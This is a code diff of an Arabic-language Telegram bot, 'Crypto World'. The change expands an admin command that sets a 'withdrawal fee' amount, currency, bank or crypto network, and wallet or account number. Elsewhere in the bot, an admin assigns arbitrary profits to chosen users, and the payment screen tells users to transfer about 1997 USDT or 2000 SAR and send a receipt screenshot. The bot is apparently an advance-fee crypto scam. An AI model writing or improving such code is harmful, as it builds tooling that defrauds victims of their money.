@@ -40,8 +40,8 @@ def load_data():
             "189415": {"amount": "1500", "assigned_user_id": None}
         },
         "fee_info": {
+            "amount": "1997",
             "currency": "USDT",
-            "amount": "1997 دولار",
             "network": "BNB Smart Chain (BEP20)",
             "address": "0x4aaf2231199d24842e606f99b4f69bb5cddb171e"
         },
@@ -68,8 +68,8 @@ user_states = db.get("states", {})
 user_custom_data = db.get("custom_data", {})
 custom_profits = db.get("profits", {})
 withdraw_fee_info = db.get("fee_info", {
+    "amount": "1997",
     "currency": "USDT",
-    "amount": "1997 دولار",
     "network": "BNB Smart Chain (BEP20)",
     "address": "0x4aaf2231199d24842e606f99b4f69bb5cddb171e"
 })
@@ -88,33 +88,39 @@ def estimate_account_age(user_id: int) -> str:
     else:
         return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"
 
-# أمر الأدمن لتعديل رسوم وعنوان السحب: /setfee <المبلغ> <العنوان>
-async def set_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# أمر الأدمن لتعديل تفاصيل رسوم السحب: /setwithdrawfee <المبلغ> <العملة> <الشبكة/البنك> <العنوان/الحساب>
+async def set_withdraw_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
 
     args = context.args
-    if len(args) < 2:
+    if len(args) < 4:
         await update.message.reply_text(
             "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
             "اكتب الأمر بهذا الشكل:\n"
-            "`/setfee <المبلغ> <عنوان_المحفظة>`\n\n"
-            "مثال:\n`/setfee 1997 دولار 0x4aaf...`",
+            "`/setwithdrawfee <المبلغ> <العملة> <الشبكة_أو_البنك> <العنوان_أو_الحساب>`\n\n"
+            "مثال SAR:\n`/setwithdrawfee 2000 SAR الراجحي 260000010006080404601`\n\n"
+            "مثال USDT:\n`/setwithdrawfee 1997 USDT BEP20 0x4aaf...`",
             parse_mode="Markdown"
         )
         return
 
-    new_amount = args[0]
-    new_address = " ".join(args[1:])
+    amount = args[0]
+    currency = args[1].upper()
+    network = args[2]
+    address = " ".join(args[3:])
 
-    withdraw_fee_info["amount"] = new_amount
-    withdraw_fee_info["address"] = new_address
+    withdraw_fee_info["amount"] = amount
+    withdraw_fee_info["currency"] = currency
+    withdraw_fee_info["network"] = network
+    withdraw_fee_info["address"] = address
     save_data_to_file()
 
     await update.message.reply_text(
         f"✅ **تم تحديث تفاصيل رسوم السحب بنجاح!**\n\n"
-        f"• المبلغ الجديد: `{new_amount}`\n"
-        f"• العنوان الجديد:\n`{new_address}`",
+        f"• المبلغ: `{amount} {currency}`\n"
+        f"• البنك / الشبكة: `{network}`\n"
+        f"• الحساب / العنوان:\n`{address}`",
         parse_mode="Markdown"
     )
 
@@ -165,7 +171,7 @@ async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
             "اكتب الأمر بهذا الشكل:\n"
             "`/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`\n\n"
-            "مثال:\n`/setprofit 7004113433 45500 3585556`",
+            "مثال:\n`/setprofit 8968241467 2000 3585556`",
             parse_mode="Markdown"
         )
         return
@@ -476,9 +482,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pay_details = (
             "💳 **دفع رسوم السحب:**\n\n"
             f"العملة: **{withdraw_fee_info['currency']}**\n"
-            f"المبلغ: **{withdraw_fee_info['amount']}**\n"
-            f"الشبكة: **{withdraw_fee_info['network']}**\n\n"
-            "العنوان:\n"
+            f"المبلغ: **{withdraw_fee_info['amount']} {withdraw_fee_info['currency']}**\n"
+            f"الشبكة / البنك: **{withdraw_fee_info['network']}**\n\n"
+            "الحساب / العنوان:\n"
             f"`{withdraw_fee_info['address']}`\n\n"
             "يرجى تحويل مبلغ الرسوم المطلوبة، ثم إرسال صورة الوصل (Screenshot) هنا في المحادثة ليتم تأكيد سحبك بنجاح."
         )
@@ -497,12 +503,12 @@ def main():
     app.add_handler(CommandHandler("codes", admin_get_codes))
     app.add_handler(CommandHandler("setprofit", set_profit))
     app.add_handler(CommandHandler("broadcast", broadcast_message))
-    app.add_handler(CommandHandler("setfee", set_fee_command))  # أمر تعديل رسوم وعنوان السحب
+    app.add_handler(CommandHandler("setwithdrawfee", set_withdraw_fee_command))  # أمر تعديل الرسوم الشامل
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل الآن مع أمر تعديل رسوم السحب (/setfee)...")
+    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل بكفاءة تامة مع تخصيص رسوم السحب...")
     app.run_polling()
 
 if __name__ == "__main__":
